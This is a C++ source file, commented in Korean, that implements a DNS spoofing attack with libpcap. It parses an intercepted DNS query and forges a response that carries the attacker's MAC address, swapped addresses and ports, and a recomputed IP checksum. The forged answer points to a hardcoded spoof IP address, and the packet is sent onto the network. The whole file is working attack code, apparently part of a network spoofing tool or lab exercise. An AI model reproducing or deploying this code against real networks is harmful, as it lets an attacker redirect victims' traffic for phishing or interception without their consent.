#include "dns_spoof.hpp"
#include "network_utils.hpp"  // ip_header, udp_header 등 필요
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <iostream>
#include <arpa/inet.h>

using namespace std;

std::string extract_domain_name(const uint8_t* dns_data, size_t dns_len) {
    std::string domain;
    size_t pos = 12; // DNS 헤더는 12바이트
    while (pos < dns_len) {
        uint8_t len = dns_data[pos];
        if (len == 0) break;
        if (!domain.empty()) domain.push_back('.');
        pos++;
        for (int i = 0; i < len && pos < dns_len; i++, pos++) {
            domain.push_back(dns_data[pos]);
        }
    }
    return domain;
}

void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_packet_len,
                             const u_int8_t* attacker_mac, const u_int8_t* gateway_ip) {
    const int eth_len = 14;
    struct ip_header* ip = (struct ip_header*)(orig_packet + eth_len);
    int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
    struct udp_header* udp = (struct udp_header*)(orig_packet + eth_len + ip_header_len);
    int udp_header_len = sizeof(udp_header);
    
    struct dns_header* dns = (struct dns_header*)(orig_packet + eth_len + ip_header_len + udp_header_len);
    int dns_header_len = sizeof(dns_header);
    uint8_t* query_ptr = (uint8_t*)dns + dns_header_len;
    int qname_len = 0;
    while(qname_len < (int)(orig_packet_len - (eth_len + dns_header_len)) && query_ptr[qname_len] != 0)
        qname_len++;
    qname_len++; // null byte 포함
    int question_extra = 4; // QTYPE(2) + QCLASS(
    int question_len = dns_header_len + qname_len + question_extra;
    const int answer_len = 16;
    int new_dns_payload_len = question_len + answer_len;
    int new_udp_len = udp_header_len + new_dns_payload_len;
    int new_ip_total_len = ip_header_len + new_udp_len;
    int new_packet_len = eth_len + new_ip_total_len;
    
    u_int8_t* spoof_packet = new u_int8_t[new_packet_len];
    memset(spoof_packet, 0, new_packet_len);
    
    // Ethernet 헤더: 요청자에게 전송
    struct ether_header* orig_eth = (struct ether_header*)orig_packet;
    struct ether_header* eth_resp = (struct ether_header*)spoof_packet;
    memcpy(eth_resp->ether_dhost, orig_eth->ether_shost, 6);
    memcpy(eth_resp->ether_shost, attacker_mac, 6);
    
    // IP 헤더: src와 dst swap, 길이 및 체크섬 재계산
    struct ip_header* ip_resp = (struct ip_header*)(spoof_packet + eth_len);
    memcpy(ip_resp, ip, ip_header_len);
    uint32_t temp_ip = ip_resp->ip_src;
    ip_resp->ip_src = ip_resp->ip_dst;
    ip_resp->ip_dst = temp_ip;
    ip_resp->ip_len = htons(new_ip_total_len);
    ip_resp->ip_sum = 0;
    uint16_t* ip_words = (uint16_t*)ip_resp;
    unsigned long ip_sum = 0;
    for (int i = 0; i < ip_header_len/2; i++)
        ip_sum += ntohs(ip_words[i]);
    while(ip_sum >> 16)
        ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
    ip_resp->ip_sum = htons(~ip_sum);
    
    // UDP 헤더: 포트 swap 및 길이 재설정
    struct udp_header* udp_resp = (struct udp_header*)(spoof_packet + eth_len + ip_header_len);
    memcpy(udp_resp, udp, udp_header_len);
    udp_resp->uh_sport = udp->uh_dport;
    udp_resp->uh_dport = udp->uh_sport;
    udp_resp->uh_len = htons(new_udp_len);
    udp_resp->uh_sum = 0;
    
    // DNS 헤더: 응답 플래그 및 응답 레코드 수 수정
    struct dns_header* dns_resp = (struct dns_header*)(spoof_packet + eth_len + ip_header_len + udp_header_len);
    
    memcpy(dns_resp, dns, dns_header_len);
    dns_resp->flags = htons(0x8180);
    dns_resp->ancount = htons(1);
    
    uint8_t* dns_payload_resp = (uint8_t*)dns_resp;
    memcpy(dns_payload_resp + dns_header_len, query_ptr, qname_len + question_extra);
    
    uint8_t* answer_ptr = dns_payload_resp + question_len;
    answer_ptr[0] = 0xC0;
    answer_ptr[1] = 0x0C;
    answer_ptr[2] = 0x00;
    answer_ptr[3] = 0x01;
    answer_ptr[4] = 0x00;
    answer_ptr[5] = 0x01;
    answer_ptr[6] = 0x00;
    answer_ptr[7] = 0x00;
    answer_ptr[8] = 0x01;
    answer_ptr[9] = 0x2C;
    answer_ptr[10] = 0x00;
    answer_ptr[11] = 0x04;
    // 스푸핑 IP (예시)
    uint8_t spoof_ip[4] = {192, 168, 127, 132};
    memcpy(answer_ptr + 12, spoof_ip, 4);
    
    if (pcap_sendpacket(handle, spoof_packet, new_packet_len) != 0)
        cerr << "Failed to send spoof DNS response: " << pcap_geterr(handle) << endl;
    else
        cout << "Spoof DNS response sent successfully.\n";
    
    delete[] spoof_packet;
}
